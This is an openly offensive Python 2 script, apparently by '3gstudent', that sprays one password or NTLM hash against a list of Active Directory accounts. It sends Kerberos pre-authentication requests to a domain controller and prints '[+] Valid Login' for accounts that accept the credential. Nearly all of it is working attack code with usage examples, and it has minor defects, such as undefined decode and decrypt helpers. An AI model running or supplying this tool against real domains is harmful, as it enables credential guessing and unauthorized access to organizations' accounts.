#!/usr/bin/python
import sys, os
import socket
from random import getrandbits
from time import time, localtime, strftime
from pyasn1.type.univ import Integer, Sequence, SequenceOf, OctetString, BitString, Boolean
from pyasn1.type.char import GeneralString
from pyasn1.type.useful import GeneralizedTime
from pyasn1.type.tag import Tag, tagClassContext, tagClassApplication, tagFormatSimple
from pyasn1.codec.der.encoder import encode
from struct import pack, unpack
from pyasn1.type.namedtype import NamedTypes, NamedType, OptionalNamedType
from Crypto.Cipher import ARC4
from Crypto.Cipher import MD4, MD5
from time import time, gmtime, strftime, strptime, localtime
import hmac as HMAC
from random import getrandbits, sample

RC4_HMAC = 23
NT_PRINCIPAL = 1
NT_SRV_INST =2

def random_bytes(n):
    return ''.join(chr(c) for c in sample(xrange(256), n))

def encrypt(etype, key, msg_type, data):
    if etype != RC4_HMAC:
        raise NotImplementedError('Only RC4-HMAC supported!')
    k1 = HMAC.new(key, pack('<I', msg_type)).digest()
    data = random_bytes(8) + data
    chksum = HMAC.new(k1, data).digest()
    k3 = HMAC.new(k1, chksum).digest()
    return chksum + ARC4.new(k3).encrypt(data)

def epoch2gt(epoch=None, microseconds=False):
    if epoch is None:
        epoch = time()
    gt = strftime('%Y%m%d%H%M%SZ', gmtime(epoch))
    if microseconds:
        ms = int(epoch * 1000000) % 1000000
        return (gt, ms)
    return gt



def ntlm_hash(pwd):
    return MD4.new(pwd.encode('utf-16le'))

def _c(n, t):
    return t.clone(tagSet=t.tagSet + Tag(tagClassContext, tagFormatSimple, n))

def _v(n, t):
    return t.clone(tagSet=t.tagSet + Tag(tagClassContext, tagFormatSimple, n), cloneValueFlag=True)


def application(n):
    return Sequence.tagSet + Tag(tagClassApplication, tagFormatSimple, n)

class Microseconds(Integer): pass

class KerberosString(GeneralString): pass

class Realm(KerberosString): pass

class PrincipalName(Sequence):
    componentType = NamedTypes(
        NamedType('name-type', _c(0, Integer())),
        NamedType('name-string', _c(1, SequenceOf(componentType=KerberosString()))))

class KerberosTime(GeneralizedTime): pass

class HostAddress(Sequence):
    componentType = NamedTypes(
        NamedType('addr-type', _c(0, Integer())),
        NamedType('address', _c(1, OctetString())))

class HostAddresses(SequenceOf):
    componentType = HostAddress()


class PAData(Sequence):
    componentType = NamedTypes(
        NamedType('padata-type', _c(1, Integer())),
        NamedType('padata-value', _c(2, OctetString())))

    
class KerberosFlags(BitString): pass

class EncryptedData(Sequence):
    componentType = NamedTypes(
        NamedType('etype', _c(0, Integer())),
        OptionalNamedType('kvno', _c(1, Integer())),
        NamedType('cipher', _c(2, OctetString())))
    
class PaEncTimestamp(EncryptedData): pass


class Ticket(Sequence):
    tagSet = application(1)
    componentType = NamedTypes(
        NamedType('tkt-vno', _c(0, Integer())),
        NamedType('realm', _c(1, Realm())),
        NamedType('sname', _c(2, PrincipalName())),
        NamedType('enc-part', _c(3, EncryptedData())))
    
class KDCOptions(KerberosFlags): pass

class KdcReqBody(Sequence):
    componentType = NamedTypes(
        NamedType('kdc-options', _c(0, KDCOptions())),
        OptionalNamedType('cname', _c(1, PrincipalName())),
        NamedType('realm', _c(2, Realm())),
        OptionalNamedType('sname', _c(3, PrincipalName())),
        OptionalNamedType('from', _c(4, KerberosTime())),
        NamedType('till', _c(5, KerberosTime())),
        OptionalNamedType('rtime', _c(6, KerberosTime())),
        NamedType('nonce', _c(7, Integer())),
        NamedType('etype', _c(8, SequenceOf(componentType=Integer()))))

class KdcReq(Sequence):
    componentType = NamedTypes(
        NamedType('pvno', _c(1, Integer())),
        NamedType('msg-type', _c(2, Integer())),
        NamedType('padata', _c(3, SequenceOf(componentType=PAData()))),
        NamedType('req-body', _c(4, KdcReqBody())))

class PaEncTsEnc(Sequence):
    componentType = NamedTypes(
        NamedType('patimestamp', _c(0, KerberosTime())),
        NamedType('pausec', _c(1, Microseconds())))


class AsReq(KdcReq):
    tagSet = application(10)

def build_req_body(realm, service, host, nonce, cname=None):
 
    req_body = KdcReqBody()

    # (Forwardable, Proxiable, Renewable, Canonicalize)
#   req_body['kdc-options'] = "'01010000100000000000000000000000'B"
    req_body['kdc-options'] = "'00000000000000000000000000010000'B"
    if cname is not None:
        req_body['cname'] = None
        req_body['cname']
        req_body['cname']['name-type'] = NT_PRINCIPAL
        req_body['cname']['name-string'] = None
        req_body['cname']['name-string'][0] = cname

    req_body['realm'] = realm

    req_body['sname'] = None
    req_body['sname']['name-type'] = NT_SRV_INST
    req_body['sname']['name-string'] = None
    req_body['sname']['name-string'][0] = service
    req_body['sname']['name-string'][1] = host

    req_body['till'] = '19700101000000Z'
    
    req_body['nonce'] = nonce

    req_body['etype'] = None
    req_body['etype'][0] = RC4_HMAC
    
    return req_body

def build_pa_enc_timestamp(current_time, key):
    gt, ms = epoch2gt(current_time, microseconds=True)
    pa_ts_enc = PaEncTsEnc()
    pa_ts_enc['patimestamp'] = gt
    pa_ts_enc['pausec'] = ms

    pa_ts = PaEncTimestamp()
    pa_ts['etype'] = key[0]
    pa_ts['cipher'] = encrypt(key[0], key[1], 1, encode(pa_ts_enc))

    return pa_ts


def build_as_req(target_realm, user_name, key, current_time, nonce):

    req_body = build_req_body(target_realm, 'krbtgt', target_realm, nonce, cname=user_name)
    pa_ts = build_pa_enc_timestamp(current_time, key)
    
    as_req = AsReq()

    as_req['pvno'] = 5
    as_req['msg-type'] = 10

    as_req['padata'] = None
    as_req['padata'][0] = None
    as_req['padata'][0]['padata-type'] = 2
    as_req['padata'][0]['padata-value'] = encode(pa_ts)


    as_req['req-body'] = _v(4, req_body)

    return as_req

def send_req_tcp(req, kdc, port=88):
    data = encode(req)
    data = pack('>I', len(data)) + data
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((kdc, port))
    sock.send(data)
    return sock

def send_req_udp(req, kdc, port=88):
    data = encode(req)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.connect((kdc, port))
    sock.send(data)
    return sock

def recv_rep_tcp(sock):
    data = ''
    datalen = None
    while True:
        rep = sock.recv(8192)
        if not rep:
            sock.close()
            raise IOError('Connection error')
        data += rep
        if len(rep) >= 4:
            if datalen is None:
                datalen = unpack('>I', rep[:4])[0]
            if len(data) >= 4 + datalen:
                sock.close()
                return data[4:4 + datalen]

def recv_rep_udp(sock):
    data = ''
    datalen = None
    while True:
        rep = sock.recv(8192)
        if not rep:
            sock.close()
            raise IOError('Connection error')
        data += rep
        if len(rep) >= 4:
            sock.close()
            return data



def _decrypt_rep(data, key, spec, enc_spec, msg_type):
    rep = decode(data, asn1Spec=spec)[0]
    rep_enc = str(rep['enc-part']['cipher'])
    rep_enc = decrypt(key[0], key[1], msg_type, rep_enc)
    rep_enc = decode(rep_enc, asn1Spec=enc_spec)[0]
    
    return rep, rep_enc
    

def passwordspray_tcp(user_realm, user_name, user_key, kdc_a, orgin_key):



    nonce = getrandbits(31)
    current_time = time()
    as_req = build_as_req(user_realm, user_name, user_key, current_time, nonce)
    sock = send_req_tcp(as_req, kdc_a)
    data = recv_rep_tcp(sock)
    i=0
    for c in data:       
        i=i+1
        if(i==18):
            if(ord(c)==0x0b):
                print('[+] Valid Login: %s:%s'%(user_name,orgin_key))

def passwordspray_udp(user_realm, user_name, user_key, kdc_a, orgin_key):



    nonce = getrandbits(31)
    current_time = time()
    as_req = build_as_req(user_realm, user_name, user_key, current_time, nonce)
    sock = send_req_udp(as_req, kdc_a)
    data = recv_rep_udp(sock)
    i=0
    for c in data:       
        i=i+1
        if(i==18):
            if(ord(c)==0x0b):
                print('[+] Valid Login: %s:%s'%(user_name,orgin_key))
   
if __name__ == '__main__':

    if len(sys.argv)!=7:
        print('[!]Wrong parameter')
        print('Use Kerberos pre-authentication to test a single password against a list of Active Directory accounts.')
        print('Reference:')
        print('  https://github.com/ropnop/kerbrute')
        print('  https://github.com/mubix/pykek')
        print('Author: 3gstudent')
	print('Usage:')
	print('	%s <domainControlerAddr> <domainName> <file> <passwordtype> <data> <mode>'%(sys.argv[0]))
        print('<passwordtype>: clearpassword or ntlmhash')
        print('<mode>: tcp or udp')
	print('Eg.')
	print('	%s 192.168.1.1 test.com user.txt clearpassword DomainUser123! tcp'%(sys.argv[0]))
	print('	%s 192.168.1.1 test.com user.txt ntlmhash e00045bd566a1b74386f5c1e3612921b udp'%(sys.argv[0]))
	sys.exit(0)
    else:
        kdc_a = sys.argv[1]
        user_realm = sys.argv[2].upper()
        print('[*] DomainControlerAddr: %s'%(kdc_a))
        print('[*] DomainName:          %s'%(user_realm))
        print('[*] UserFile:            %s'%(sys.argv[3]))

        
        if sys.argv[4]=='clearpassword':
            print('[*] ClearPassword:       %s'%(sys.argv[5]))
            user_key = (RC4_HMAC, ntlm_hash(sys.argv[5]).digest())
            
        elif sys.argv[4]=='ntlmhash':
            print('[*] NTLMHash:            %s'%(sys.argv[5]))
            user_key = (RC4_HMAC, sys.argv[5].decode('hex'))
            
        else:
            print('[!]Wrong parameter of <passwordtype>')
            sys.exit(0)     

        file_object = open(sys.argv[3], 'r')

        if sys.argv[6]=='tcp':
            print('[*] Using TCP to test a single password against a list of Active Directory accounts.')
            for line in file_object:
                passwordspray_tcp(user_realm, line.strip('\r\n'), user_key, kdc_a, sys.argv[5])
        elif sys.argv[6]=='udp':
            print('[*] Using UDP to test a single password against a list of Active Directory accounts.')  
            for line in file_object:
                passwordspray_udp(user_realm, line.strip('\r\n'), user_key, kdc_a, sys.argv[5])
        else:
            print('[!]Wrong parameter of <mode>')
            sys.exit(0)     


        print('All done.')
        

